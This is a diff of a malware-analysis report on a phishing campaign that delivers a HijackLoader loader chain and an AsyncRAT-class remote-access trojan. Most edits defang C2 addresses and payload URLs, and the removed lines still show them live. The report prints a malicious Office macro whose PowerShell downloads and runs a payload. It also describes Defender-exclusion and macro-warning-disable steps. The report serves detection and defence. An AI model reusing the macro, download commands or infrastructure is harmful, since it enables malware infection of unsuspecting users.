@@ -245,7 +245,7 @@ process_tree:
                             leaving. That is the whole window a defender has.
                           facts:
                             - key: "Endpoint"
-                              value: '185.241.208[.]129:56167'
+                              value: '185[.]241[.]208[.]129:56167'
                             - key: "Transport"
                               value: 'TLSv1'
                             - key: "Network"
@@ -300,7 +300,7 @@ process_tree:
                               value: '1730e17c2277c47cd6c40037d2f12133'
 ---
 
-**Campaign Identifier:** HijackLoader-Penguish-MultiVector-62.60.237.100<br>
+**Campaign Identifier:** HijackLoader-Penguish-MultiVector-62[.]60[.]237[.]100<br>
 **Last Updated:** May 6, 2026<br>
 **Threat Level:** HIGH
 
@@ -308,7 +308,7 @@ process_tree:
 {: .hl-tier-1}
 {: .hl-tab-overview}
 
-A live, 15-month-old multi-vector phishing campaign on OFAC-sanctioned bulletproof infrastructure (`62.60.237[.]100`, AS210644 AEZA, Finland) delivers a HijackLoader / Penguish / Rugmi loader chain that ends in an AsyncRAT-class .NET RAT beaconing to `185.241.208[.]129:56167` on Spamhaus DROP-listed AS210558 (1337 Services, Poland). The campaign is tracked here as **<a href="/actors/UTA-2026-007/">UTA-2026-007</a>** *(an internal tracking label used by The Hunters Ledger, see Section 11)*. Threat level is **HIGH** (overall risk score 7.5/10). The multiplicity of evasion layers (multi-vendor camouflage bundle, hostname-keyed per-host KDF, renamed signed Qihoo binary as .NET injection host, legacy `.job` autorunsc blind spot) compresses time-to-detect from sample launch to first C2 beacon to ~43 seconds. The single highest-value durable defender signal is the **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3`**. It fingerprints the malware's TLS client behavior independently of the C2 IP and rotating-IP infrastructure cannot defeat it. Attribution to a publicly named threat group rests at LOW confidence (58%); Russian-speaking operator language attribution is HIGH confidence (90%).
+A live, 15-month-old multi-vector phishing campaign on OFAC-sanctioned bulletproof infrastructure (`62[.]60[.]237[.]100`, AS210644 AEZA, Finland) delivers a HijackLoader / Penguish / Rugmi loader chain that ends in an AsyncRAT-class .NET RAT beaconing to `185[.]241[.]208[.]129:56167` on Spamhaus DROP-listed AS210558 (1337 Services, Poland). The campaign is tracked here as **<a href="/actors/UTA-2026-007/">UTA-2026-007</a>** *(an internal tracking label used by The Hunters Ledger, see Section 11)*. Threat level is **HIGH** (overall risk score 7.5/10). The multiplicity of evasion layers (multi-vendor camouflage bundle, hostname-keyed per-host KDF, renamed signed Qihoo binary as .NET injection host, legacy `.job` autorunsc blind spot) compresses time-to-detect from sample launch to first C2 beacon to ~43 seconds. The single highest-value durable defender signal is the **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3`**. It fingerprints the malware's TLS client behavior independently of the C2 IP and rotating-IP infrastructure cannot defeat it. Attribution to a publicly named threat group rests at LOW confidence (58%); Russian-speaking operator language attribution is HIGH confidence (90%).
 
 ---
 
@@ -320,12 +320,12 @@ A Russian-speaking commodity-malware operator, tracked here as **<a href="/actor
 
 This report exists because existing public reporting on HijackLoader, Penguish and Rugmi, and on AsyncRAT-class downstream payloads, covers the individual stages of this kill chain in isolation. No public report links the full chain, the Inno Setup `InitializeSetup() returns False` distribution stealth, the multi-vendor genuine-binary co-location, the cross-campaign renamed-Qihoo-PromoUtil hollow host TTP cluster, and the per-host hostname-keyed KDF that resisted around 270 cryptographic recovery combinations, to the same campaign with end-to-end byte confirmation. This report fills that gap.
 
-What I found is a 32+ artifact open directory at `62.60.237[.]100/Documents/` (AEZA Finland, AS210644, **OFAC-sanctioned**) hosting a complete multi-vector phishing kit. Eight parallel execution primitives, `.url` Internet Shortcuts, `.lnk` shortcuts, `.scr` and `.msi` files using Right-to-Left Override disguise, macro Office documents, `.xll` Excel add-ins, MSC files using the GrimResource technique, HTA/MHT/MHTML proof-of-concept artifacts, and SFX installers, all converge on the same loader chain. The final stage beacons over TLSv1 to `185.241.208[.]129:56167` (1337 Services GmbH, Poland, AS210558, **Spamhaus DROP-listed**). Three independent VirusTotal IDS rules confirm the family is AsyncRAT-class, and the campaign infrastructure has been live for 15+ months, first observed 2025-02-08 against an investigation date of 2026-05-06.
+What I found is a 32+ artifact open directory at `62[.]60[.]237[.]100/Documents/` (AEZA Finland, AS210644, **OFAC-sanctioned**) hosting a complete multi-vector phishing kit. Eight parallel execution primitives, `.url` Internet Shortcuts, `.lnk` shortcuts, `.scr` and `.msi` files using Right-to-Left Override disguise, macro Office documents, `.xll` Excel add-ins, MSC files using the GrimResource technique, HTA/MHT/MHTML proof-of-concept artifacts, and SFX installers, all converge on the same loader chain. The final stage beacons over TLSv1 to `185[.]241[.]208[.]129:56167` (1337 Services GmbH, Poland, AS210558, **Spamhaus DROP-listed**). Three independent VirusTotal IDS rules confirm the family is AsyncRAT-class, and the campaign infrastructure has been live for 15+ months, first observed 2025-02-08 against an investigation date of 2026-05-06.
 
 **Key Takeaways.**
 
 - **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` is the single highest-value durable detection signal in this campaign.** It fingerprints the malware's TLS client behavior independently of the C2 IP. IP rotation cannot defeat JA3 detection. Block at network perimeter immediately.
-- **DNS-based detection (RPZ, sinkholes, DGA detection) WILL NOT catch this campaign.** The C2 IP `185.241.208.129` is hardcoded in the loader/payload and never queried via DNS (49 DNS queries observed in the run, none point to operator infrastructure). Detection must be IP-based, JA3-based, or behavioral.
+- **DNS-based detection (RPZ, sinkholes, DGA detection) WILL NOT catch this campaign.** The C2 IP `185[.]241[.]208[.]129` is hardcoded in the loader/payload and never queried via DNS (49 DNS queries observed in the run, none point to operator infrastructure). Detection must be IP-based, JA3-based, or behavioral.
 - **Persistence uses legacy `.job` format that the standard Sysinternals autorunsc tool does NOT enumerate by default.** Defenders relying solely on autorunsc inventory will miss this. Hunt for `*.job` file creation in `C:\Windows\Tasks\` from non-system-installer parents OR enumerate `C:\Windows\System32\Tasks\watchermgmt` directly.
 - **The renamed-Qihoo-PromoUtil hollow-host pattern reuses across 8+ campaigns since 2025**: defenders should detect the PATTERN (orphaned `WVault.exe` or any renamed `PromoUtil.exe` with `clr.dll!CreateAssemblyNameObject` thread start addresses) rather than specific hashes. The hash rotates per campaign; the pattern is durable.
 - **Time-to-detect window is ~43 seconds from sample launch to first C2 beacon.** File-based blocking must act inside this window OR behavioral detection at the orphan-`WVault.exe` stage is required. SIEM/EDR latency over ~60 seconds is too slow for prevention; only detection-and-response is feasible.
@@ -356,7 +356,7 @@ What I found is a 32+ artifact open directory at `62.60.237[.]100/Documents/` (A
 The campaign scores 7.5 out of 10 overall, which is HIGH. Detection is feasible, because the durable signals listed in Key Takeaways above, the TLS fingerprint, the persistence file pattern and the hollow-host process tree, give multiple non-overlapping options, and the full detection package is in Section 10. The risk lies in the multiplicity of evasion layers and in the operator's selective depth, high-tier work in chosen areas like camouflage, the KDF and the hollow host, alongside commodity choices elsewhere like the Inno Setup wrapper and the commodity loader. This is a MaaS-customer and bundle-camouflage integrator profile, not a script kiddie.
 
 The threat actor is **<a href="/actors/UTA-2026-007/">UTA-2026-007</a>**, tracked at three confidence levels, with the full assessment in Section 11:
-- **Russian-speaking operator: HIGH confidence (90%)**: `VSEZBSRABOTAT.url` filename, Russian-language Kraken-exchange URL on second-stage IP, `busket/` Mega.io subdir typo (English-second-language tell), and SPecialiST RePack YARA hit on `NDA.doc`
+- **Russian-speaking operator: HIGH confidence (90%)**: `VSEZBSRABOTAT.url` filename, Russian-language Kraken-exchange URL on second-stage IP, `busket/` Mega[.]io subdir typo (English-second-language tell), and SPecialiST RePack YARA hit on `NDA.doc`
 - **Distinct operator (not coincidental shared bulletproof tenancy): MODERATE confidence (75%)**: four cross-vector fingerprints stable across 15+ months and seven delivery vectors
 - **Publicly named actor link: LOW confidence (58%)**: TAG-150 / GrayBravo and TA544 / Narwhal Spider both ruled out at INSUFFICIENT confidence; treat <a href="/actors/UTA-2026-007/">UTA-2026-007</a> as a tracking label, not a public actor identity
 
@@ -418,7 +418,7 @@ The loader has evolved measurably between 2023 and 2026. Key milestones from pub
 | 2025-04 | TAG-150 / GrayBravo cluster (Recorded Future) uses HijackLoader as secondary delivery | Recorded Future |
 | 2025-07-01 | US Treasury OFAC sanctions Aeza Group (AS210644), the bulletproof hosting provider for many HijackLoader-adjacent campaigns | US Treasury OFAC |
 | 2025-07-15 | "Unmasking AsyncRAT" fork taxonomy published (DcRat / VenomRAT / SilverRAT / 40+ forks) | ESET Research |
-| 2025-12-21 | Open directory at `62.60.237[.]100/Documents/` first observed active | Self-observed |
+| 2025-12-21 | Open directory at `62[.]60[.]237[.]100/Documents/` first observed active | Self-observed |
 | 2026-03-22 | Stage 1 sample (`Carriers.exe`) first seen on VirusTotal | Self-observed via VT |
 | 2026-05-06 | This investigation; campaign infrastructure all live | Self-observed |
 
@@ -435,7 +435,7 @@ The loader has evolved measurably between 2023 and 2026. Key milestones from pub
 - Defender exclusion add via `MsMpEng.exe` (Microsoft Threat Intelligence)
 - Code-signing certificate abuse (HarfangLab October 2024)
 - Final-stage AsyncRAT-class with multiple AsyncRAT/DcRAT IDS rule hits (Abuse.ch SSLBL)
-- Mega.io payload staging (general, multiple commodity-operator reports)
+- Mega[.]io payload staging (general, multiple commodity-operator reports)
 
 **Novel or under-documented in public reporting (HIGH confidence):**
 - Stage-2 XOR key `0xE1D5B4A2` differs from canonical published `32 A3 49 B3`, fork-specific build evidence
@@ -450,7 +450,7 @@ The loader has evolved measurably between 2023 and 2026. Key milestones from pub
 - Cross-campaign `WVault.exe` hollow-host pattern, used by 8+ campaigns since 2025
 - RTLO + Cyrillic-codepoint URL substitution layered (`%e2%80%ae` + `%d1%80`)
 - `.xll` Excel-DNA delivery in a HijackLoader chain (XLL is usually paired with non-modular loaders: Dridex, Agent Tesla, Buer)
-- Mega.io `busket/` typo subdir, operator fingerprint stable across all delivery vectors for 15+ months
+- Mega[.]io `busket/` typo subdir, operator fingerprint stable across all delivery vectors for 15+ months
 
 ---
 
@@ -463,7 +463,7 @@ The loader has evolved measurably between 2023 and 2026. Key milestones from pub
 The campaign is a multi-vector phishing kit converging on a single loader chain. The user opens any of eight different lure types. Each vector unpacks to the same downstream, a HijackLoader / Penguish / Rugmi loader chain that drops a renamed signed Qihoo binary, hollows it, and injects a .NET RAT. The infographic below shows the full chain for the primary sample (`Carriers.exe`); the other seven vectors join the chain at Stage 1 (the SFX installer phase).
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-kill-chain-overview.svg" | relative_url }}" alt="Vertical flowchart of the 11-stage HijackLoader / Penguish / Rugmi to AsyncRAT-class kill chain. Stages flow top-to-bottom with arrows. Stage 0 (orange) Initial Access, 8 parallel delivery vectors (.url, .lnk, .scr/.msi RTLO, macro Office, .xll, .msc GrimResource, .hta/.mht/.mhtml POCs, fake-PDF .exe). Stage 1 (amber) SFX Wrapper Carriers.exe Inno Setup 6.5+, Pascal Script InitializeSetup -> WinExec -> return False with silent installer abort. Stage 2 (red) Side-load Host CrystSupervisor32.exe (renamed Wondershare SlideShowEditor.exe) loads operator-modified ExceptionHandler.dll with Plowshare PDB and inline reflective loader. Stage 3 (purple) First DLL Hollow into Windows tapisrv.dll, reads shadermgr93.rc 27 KB config, copies 5808 bytes of stage-2 shellcode. Stage 4 (red) Stage-2 Shellcode 5808 bytes 8-phase architecture, X65599 hash table, anti-sandbox quadruple, reads networkspec17.log 2.6 MB and decodes through PNG-IDAT chunk walker, 4-byte XOR with key 0xE1D5B4A2, LZNT1 chunked to 3.75 MB. Stage 5 (purple) Second DLL Hollow into Windows input.dll. Stage 6 (cyan) Stage-3 PE Bundle 8 PEs split into 5 genuine signed binaries (Crisp Squirrel, Info-ZIP, two Google Updater PEs, Qihoo 360 PromoUtil) and 3 operator PEs (pe_03 HijackLoader proper, pe_06 GoProxy MITM CA installer, pe_07 bundle-cleanup helper). Stage 7 (red) Per-host KDF via ntdll!RtlHashUnicodeString, seed = X65599(GetComputerNameW()) XOR 0xa1b2d3b4 used as both PRNG seed and decryption key, resisted ~270 cipher recovery attempts. Stage 8 (purple) WVault.exe Hollow, genuine Qihoo PromoUtil dropped to C:\\ProgramData\\WVault.exe with parent process orphaned, .NET CLR thread start addresses visible (clr.dll!CreateAssemblyNameObject, GetIdentityAuthority). Cross-campaign TTP across 8+ campaigns since 2025. Stage 9 (dark red) Persistence + Defender Bypass + GoProxy CA cert install at thumbprint 0174E68C97DDF1E0EEEA415EA336A163D2B61AFD. Stage 10 (dark red) C2 Beacon TLSv1 to 185.241.208[.]129:56167 (hardcoded IP, no DNS), JA3 07af4aa9e4d215a5ee63f9a0a277fbe3 matches SSLBL AsyncRAT JA3, JA4 t10i060500_4dc025c38c38_1a3805c3aa63, ClientHello cipher list 49162-49161-49172-49171-53-47. Footer: total time from sample launch to first C2 beacon approximately 43 seconds, file-based blocking must act inside this window or behavioral detection at Stage 8 is required.">
+  <img loading="lazy" src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-kill-chain-overview.svg" | relative_url }}" alt="Vertical flowchart of the 11-stage HijackLoader / Penguish / Rugmi to AsyncRAT-class kill chain. Stages flow top-to-bottom with arrows. Stage 0 (orange) Initial Access, 8 parallel delivery vectors (.url, .lnk, .scr/.msi RTLO, macro Office, .xll, .msc GrimResource, .hta/.mht/.mhtml POCs, fake-PDF .exe). Stage 1 (amber) SFX Wrapper Carriers.exe Inno Setup 6.5+, Pascal Script InitializeSetup -> WinExec -> return False with silent installer abort. Stage 2 (red) Side-load Host CrystSupervisor32.exe (renamed Wondershare SlideShowEditor.exe) loads operator-modified ExceptionHandler.dll with Plowshare PDB and inline reflective loader. Stage 3 (purple) First DLL Hollow into Windows tapisrv.dll, reads shadermgr93.rc 27 KB config, copies 5808 bytes of stage-2 shellcode. Stage 4 (red) Stage-2 Shellcode 5808 bytes 8-phase architecture, X65599 hash table, anti-sandbox quadruple, reads networkspec17.log 2.6 MB and decodes through PNG-IDAT chunk walker, 4-byte XOR with key 0xE1D5B4A2, LZNT1 chunked to 3.75 MB. Stage 5 (purple) Second DLL Hollow into Windows input.dll. Stage 6 (cyan) Stage-3 PE Bundle 8 PEs split into 5 genuine signed binaries (Crisp Squirrel, Info-ZIP, two Google Updater PEs, Qihoo 360 PromoUtil) and 3 operator PEs (pe_03 HijackLoader proper, pe_06 GoProxy MITM CA installer, pe_07 bundle-cleanup helper). Stage 7 (red) Per-host KDF via ntdll!RtlHashUnicodeString, seed = X65599(GetComputerNameW()) XOR 0xa1b2d3b4 used as both PRNG seed and decryption key, resisted ~270 cipher recovery attempts. Stage 8 (purple) WVault.exe Hollow, genuine Qihoo PromoUtil dropped to C:\\ProgramData\\WVault.exe with parent process orphaned, .NET CLR thread start addresses visible (clr.dll!CreateAssemblyNameObject, GetIdentityAuthority). Cross-campaign TTP across 8+ campaigns since 2025. Stage 9 (dark red) Persistence + Defender Bypass + GoProxy CA cert install at thumbprint 0174E68C97DDF1E0EEEA415EA336A163D2B61AFD. Stage 10 (dark red) C2 Beacon TLSv1 to 185[.]241[.]208[.]129:56167 (hardcoded IP, no DNS), JA3 07af4aa9e4d215a5ee63f9a0a277fbe3 matches SSLBL AsyncRAT JA3, JA4 t10i060500_4dc025c38c38_1a3805c3aa63, ClientHello cipher list 49162-49161-49172-49171-53-47. Footer: total time from sample launch to first C2 beacon approximately 43 seconds, file-based blocking must act inside this window or behavioral detection at Stage 8 is required.">
   <figcaption><em>Figure 1: HijackLoader / Penguish / Rugmi → AsyncRAT-class kill chain. The 11 stages flow from the eight initial-access lures down to the C2 beacon at the bottom. Color coding (mapped to the site's severity palette where applicable): <span style="color:#f97316">orange</span> initial access · <span style="color:#eab308">yellow</span> dropper · <span style="color:#dc2626">red</span> operator loader · <span style="color:#58a6ff">blue</span> hollowed Windows DLL · <span style="color:#a855f7">purple</span> PE bundle (mixed legit and malicious) · <span style="color:#7f1d1d">deep red</span> persistence and C2. Sample-launch to first C2 beacon ≈ 43 seconds. File-based blocking must act inside this window, otherwise behavioral detection at the orphan-<code>WVault.exe</code> stage is required. Sections 4-6 walk each stage in technical depth.</em></figcaption>
 </figure>
 
@@ -481,7 +481,7 @@ The campaign is a multi-vector phishing kit converging on a single loader chain.
 | 7 | pe_03 resolves `RtlHashUnicodeString` and derives per-host KDF (`X65599(hostname) XOR 0xa1b2d3b4`) · 4 random env vars created | Per-host random uppercase-A-Z env-var names · encrypted `*.tmp` files |
 | 8 | `WVault.exe` (renamed Qihoo PromoUtil) spawned then orphaned · .NET CLR thread start addresses visible | Orphaned signed Qihoo binary in `C:\ProgramData\` with `clr.dll!CreateAssemblyNameObject` thread |
 | 9 | Three persistence layers: legacy `.job` scheduled task · Defender exclusion of drop dir · GoProxy CA cert install | `.job` file in `C:\Windows\Tasks\` (autorunsc blind spot) · cert thumbprint `0174E68C…2B61AFD` in registry |
-| 10 | TLSv1 beacon to `185.241.208[.]129:56167` · hardcoded IP · JA3 `07af4aa9…fbe3` matches SSLBL AsyncRAT | Outbound TLSv1 to non-standard high port from orphaned signed Qihoo binary · DNS-based detection useless |
+| 10 | TLSv1 beacon to `185[.]241[.]208[.]129:56167` · hardcoded IP · JA3 `07af4aa9…fbe3` matches SSLBL AsyncRAT | Outbound TLSv1 to non-standard high port from orphaned signed Qihoo binary · DNS-based detection useless |
 
 **Total time from sample launch to first C2 beacon: ~43 seconds.** File-based blocking needs to act in this window, or behavioral detection is required.
 
@@ -495,7 +495,7 @@ The open directory hosts a complete multi-vector phishing kit. Every vector belo
 |---|---|---|
 | `.url` Internet Shortcut | `VSEZBSRABOTAT.url`, `NDA_Verification222.url`, `Price.pdf.url`, `2.url` | `URL=file:///\\<typosquat>\…` triggers WebDAV/SMB → potential NTLM hash leak + WebDAV fetch |
 | `.lnk` shortcut | `sss.lnk`, `xxx.lnk`, `13223.lnk` | LNK target = `explorer.exe` + UNC argument padded with ~232 spaces (anti-inspection) |
-| Macro Office docs | `Price5.docm`, `Price6.doc`, `NDA.doc`, `Price4.xls` | Reverse-encoded URL → `iwr` → Mega.io payload → `start-process %TEMP%\application.exe` |
+| Macro Office docs | `Price5.docm`, `Price6.doc`, `NDA.doc`, `Price4.xls` | Reverse-encoded URL → `iwr` → Mega[.]io payload → `start-process %TEMP%\application.exe` |
 | Macro-security disable | `Excel_2016_Windows.bat` | PowerShell sets `Office\1[6,9].0\*\Security\VBAWarnings=1` |
 | RTLO disguise | `puttyfdp.scr`, `NDA_Agreementsfdp.msi`, `Carriers_Agreements_009RCARHEFfd..scr` | U+202E flips display so `.scr`/`.msi` reads as `.PDF`; new variant adds Cyrillic-р homoglyph |
 | Fake-PDF `.exe` | `NDA_Agreements.PDF_2025-12-22 06-50-31-659.exe`, `PriceList.PDF_*.exe` | Long-timestamp filename pushes `.exe` extension off Explorer's column |
@@ -532,7 +532,7 @@ Three distribution-layer components carry the loader chain: `Carriers.exe` (the 
 | Field | Value |
 |---|---|
 | Filename | `Carriers.exe` |
-| Original URL | `hxxp://62.60.237[.]100:80/Documents/Carriers.exe` |
+| Original URL | `hxxp://62[.]60[.]237[.]100:80/Documents/Carriers.exe` |
 | Size | 6,592,496 bytes (6.3 MB) |
 | SHA256 (prefix) | `1afbe5d9…` (full hash, MD5, IMPHASH in IOC feed) |
 | Compile timestamp | 2025-09-11 13:05:07 UTC |
@@ -1013,7 +1013,7 @@ Each macro document uses an `AutoOpen()` (Word) or `Workbook_Open()` (Excel) han
 
 ```vba
 Sub AutoOpen()
-Application.ScreenUpdating = False
+[A]pplication.ScreenUpdating = False
 Dim PM As Integer
 PM = Shell("powershell -C ""$RT='exe.<reverse-encoded URL>'.ToCharArray();[array]::Reverse($RT);$UT=($RT -join '');$PT = $env:temp + '\application.exe';iwr $UT -o $PT;start-process $PT;""", 0)
 End Sub
@@ -1023,10 +1023,10 @@ End Sub
 
 | Lure file | Decoded URL |
 |---|---|
-| `Price5.docm` / `Price6.doc` / `Price4.xls` | `https://s3.g.s4.mega.io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/putty2.exe` |
-| `NDA.doc` | `https://s3.g.s4.mega.io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/Bravo/vida/NGZTDICF.exe` |
+| `Price5.docm` / `Price6.doc` / `Price4.xls` | `hxxps://s3[.]g[.]s4[.]mega[.]io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/putty2.exe` |
+| `NDA.doc` | `hxxps://s3[.]g[.]s4[.]mega[.]io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/Bravo/vida/NGZTDICF.exe` |
 
-The Mega.io subdir `/busket/` is a stable operator-fingerprint typo of `/bucket/`, observed across all delivery vectors and across 15+ months of campaign duration. The `/Bravo/vida/` substructure is the operator's NDA-themed campaign codename.
+The Mega[.]io subdir `/busket/` is a stable operator-fingerprint typo of `/bucket/`, observed across all delivery vectors and across 15+ months of campaign duration. The `/Bravo/vida/` substructure is the operator's NDA-themed campaign codename.
 
 A separate file `Excel_2016_Windows.bat` pre-conditions the host by setting `HKCU\Software\Microsoft\Office\1[6,9].0\{Word,Excel}\Security\VBAWarnings = 1`, disabling macro-security warnings before the macro Office docs are opened.
 
@@ -1056,7 +1056,7 @@ The long timestamp filename (62+ characters) pushes the actual `.exe` extension 
 **Tier 1 chain (`1.msc`):**
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img loading="lazy" src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-msc-tier1-chain.svg" | relative_url }}" alt="Vertical 5-step infographic of the MSC GrimResource Tier 1 chain in 1.msc. Step 1 (orange) GrimResource Trigger: user opens 1.msc and Windows MMC launches a hidden window pointing at res://apds.dll/redirect.html?target=javascript:eval(...). The apds.dll resource accepts a target=javascript: URL parameter, giving the operator JavaScript execution from inside an XSL-transform context. Step 2 (red) JavaScript eval: eval(rootNode.Name) executes JavaScript stored in the XML rootNode name attribute, single eval() that becomes the entry point for the rest of the chain. Step 3 (red) URL-encoded XSL transform: JavaScript URL-decodes an XSL transform document containing VBScript that executes inside the MMC process. Double encoding (URL → XSL → VBScript) defeats most content-filter signatures. Step 4 (yellow) PowerShell payload fetch: VBScript spawns PowerShell with a single-source download command from https://s3.g.s4.mega[.]io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/putty.exe. Tier 1 has only this single source; Tier 2 variants (Price2.pdf.msc, MSCFile.msc) add a second fallback source for resilience. Step 5 (deep red) Execute payload + taskkill MMC self-cleanup: PowerShell starts the downloaded putty.exe as a new process, then runs taskkill /IM mmc.exe /F to terminate the parent MMC process before the user notices anything launched. Footer: detection anchors apds.dll redirect.html with javascript: target, mmc.exe spawning powershell, taskkill /IM mmc.exe.">
+  <img loading="lazy" src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-msc-tier1-chain.svg" | relative_url }}" alt="Vertical 5-step infographic of the MSC GrimResource Tier 1 chain in 1.msc. Step 1 (orange) GrimResource Trigger: user opens 1.msc and Windows MMC launches a hidden window pointing at res://apds.dll/redirect.html?target=javascript:eval(...). The apds.dll resource accepts a target=javascript: URL parameter, giving the operator JavaScript execution from inside an XSL-transform context. Step 2 (red) JavaScript eval: eval(rootNode.Name) executes JavaScript stored in the XML rootNode name attribute, single eval() that becomes the entry point for the rest of the chain. Step 3 (red) URL-encoded XSL transform: JavaScript URL-decodes an XSL transform document containing VBScript that executes inside the MMC process. Double encoding (URL → XSL → VBScript) defeats most content-filter signatures. Step 4 (yellow) PowerShell payload fetch: VBScript spawns PowerShell with a single-source download command from hxxps://s3[.]g[.]s4[.]mega[.]io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/putty.exe. Tier 1 has only this single source; Tier 2 variants (Price2.pdf.msc, MSCFile.msc) add a second fallback source for resilience. Step 5 (deep red) Execute payload + taskkill MMC self-cleanup: PowerShell starts the downloaded putty.exe as a new process, then runs taskkill /IM mmc.exe /F to terminate the parent MMC process before the user notices anything launched. Footer: detection anchors apds.dll redirect.html with javascript: target, mmc.exe spawning powershell, taskkill /IM mmc.exe.">
   <figcaption><em>Figure 12: MSC GrimResource Tier 1 kill chain. Five LOLBins are chained (MMC → JavaScript → XSL/VBScript → PowerShell → payload) to execute a remote-fetched <code>putty.exe</code> from a <code>.msc</code> file. The <code>taskkill /IM mmc.exe /F</code> at the end removes the visible host before the user reacts. Detection anchors: <code>apds.dll</code> redirect.html with <code>javascript:</code> target · <code>mmc.exe</code> spawning <code>powershell</code> · <code>taskkill /IM mmc.exe</code>.</em></figcaption>
 </figure>
 
@@ -1064,7 +1064,7 @@ The long timestamp filename (62+ characters) pushes the actual `.exe` extension 
 
 Same GrimResource entry but with two upgrades:
 1. **Defender exclusion of 6 paths** AND `Add-MpPreference -ExclusionExtension *` (wildcard extension exclusion, disables Defender's coverage on all file extensions in the excluded paths)
-2. **Dual-source download** (`curl` primary + PowerShell `iwr` fallback) from BOTH `109.120.137.6/PUTTY.exe` AND Mega.io `/busket/putty.exe`. Both downloads execute. Then `taskkill /IM mmc.exe /F` self-cleans.
+2. **Dual-source download** (`curl` primary + PowerShell `iwr` fallback) from BOTH `109[.]120[.]137[.]6/PUTTY.exe` AND Mega[.]io `/busket/putty.exe`. Both downloads execute. Then `taskkill /IM mmc.exe /F` self-cleans.
 
 The Tier-2 dual-source download pattern provides redundancy if one of the two payload servers is taken down. The operator does not need to re-build and re-distribute lure files when a server is killed.
 
@@ -1108,7 +1108,7 @@ These tools are genuine and signed (where applicable). They are not malicious in
 {: .hl-tier-3}
 {: .hl-tab-chain}
 
-`Carriers.exe` executes its full loader chain: process tree, file-drop sequence, .NET injection into `WVault.exe`, legacy `.job` persistence, and C2 beacon to `185.241.208.129:56167`, end-to-end within 43 seconds of launch, then beacons continuously.
+`Carriers.exe` executes its full loader chain: process tree, file-drop sequence, .NET injection into `WVault.exe`, legacy `.job` persistence, and C2 beacon to `185[.]241[.]208[.]129:56167`, end-to-end within 43 seconds of launch, then beacons continuously.
 
 ### 6.1 Process Tree
 
@@ -1320,7 +1320,7 @@ This delete-then-rewrite pattern is unusual, possibly anti-forensics (wipe + res
 
 | Field | Value | Source |
 |---|---|---|
-| C2 IP | `185.241.208.129` | Suricata flow + behavioral sandbox `[TCP]` log + netstat samples (PID 2596) |
+| C2 IP | `185[.]241[.]208[.]129` | Suricata flow + behavioral sandbox `[TCP]` log + netstat samples (PID 2596) |
 | C2 port | `56167` | Same |
 | Protocol | TLSv1.0 | Suricata `event_type=tls` |
 | JA3 | `07af4aa9e4d215a5ee63f9a0a277fbe3` | Suricata |
@@ -1338,13 +1338,13 @@ This delete-then-rewrite pattern is unusual, possibly anti-forensics (wipe + res
 The reconnect is fast enough that the closing and replacement connections briefly coexist: the prior beacon is still lingering in `CLOSE_WAIT` while the next one is already `ESTABLISHED` on a fresh ephemeral port, so there is no observable gap between beacons.
 - VT confirms `Carriers.exe` as a known communicating file for this IP, direct cross-reference
 - Other communicating files on this IP: `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` (sister samples)
-- Historical resolutions cluster around banking phishing infrastructure: `caisseregionale-agricole.com`, `securepay.ddns.net`, `paiementsecurise.ddns.net`, `securepay.life`, `netbillerdown.com`
+- Historical resolutions cluster around banking phishing infrastructure: `caisseregionale-agricole[.]com`, `securepay[.]ddns[.]net`, `paiementsecurise[.]ddns[.]net`, `securepay.life`, `netbillerdown[.]com`
 
 The TLS handshake did not complete past the ClientHello, so the server certificate fingerprint and HTTP/HTTPS payloads are unavailable. The JA3 hash is high-value for detection: fingerprints the malware's TLS client behavior independently of the C2 IP.
 
 ### 6.8 DNS Activity (49 unique queries: none point to C2)
 
-> **Analyst note:** This sub-section documents the DNS-resolution behavior, or rather the absence of it for C2 traffic. The 49 DNS A queries during the run all resolve legitimate Microsoft, update-service, CRL, and analytics endpoints. None of them resolve operator-controlled C2 infrastructure. The C2 IP `185.241.208.129` is hardcoded in the loader/payload and reached via direct TCP connect, never via DNS. The implication for defenders is operationally significant: DNS-based detection (RPZ, sinkholes, DGA detection) WILL NOT catch this campaign. Detection must be IP-based, JA3-based, or behavioral.
+> **Analyst note:** This sub-section documents the DNS-resolution behavior, or rather the absence of it for C2 traffic. The 49 DNS A queries during the run all resolve legitimate Microsoft, update-service, CRL, and analytics endpoints. None of them resolve operator-controlled C2 infrastructure. The C2 IP `185[.]241[.]208[.]129` is hardcoded in the loader/payload and reached via direct TCP connect, never via DNS. The implication for defenders is operationally significant: DNS-based detection (RPZ, sinkholes, DGA detection) WILL NOT catch this campaign. Detection must be IP-based, JA3-based, or behavioral.
 
 Of the 49 unique DNS A queries during the session, **NONE point to operator-controlled C2**. Categorized:
 - Microsoft telemetry / Office365 / Edge / Skype: ~25 queries
@@ -1352,7 +1352,7 @@ Of the 49 unique DNS A queries during the session, **NONE point to operator-cont
 - CRL / OCSP: Comodo, DigiCert, GlobalSign, Sectigo, Symantec
 - Baseline: doh.xfinity.com (DoH probe), test.com (connectivity self-test), api2.amplitude.com (analytics)
 
-**The malware does NOT use DNS for C2 resolution.** The C2 IP `185.241.208.129` is hardcoded in the loader/payload, never queried via DNS. Sysmon EID 22 confirms zero DNS queries from `Carriers.exe`, `Carriers.tmp`, `CrystSupervisor32.exe`, `WVault.exe`, or `Crisp.exe`.
+**The malware does NOT use DNS for C2 resolution.** The C2 IP `185[.]241[.]208[.]129` is hardcoded in the loader/payload, never queried via DNS. Sysmon EID 22 confirms zero DNS queries from `Carriers.exe`, `Carriers.tmp`, `CrystSupervisor32.exe`, `WVault.exe`, or `Crisp.exe`.
 
 **Detection implication: DNS-based detection (DNS sinkholes, RPZ, DGA detection) WILL NOT catch this campaign.** Only IP/JA3-based detection works.
 
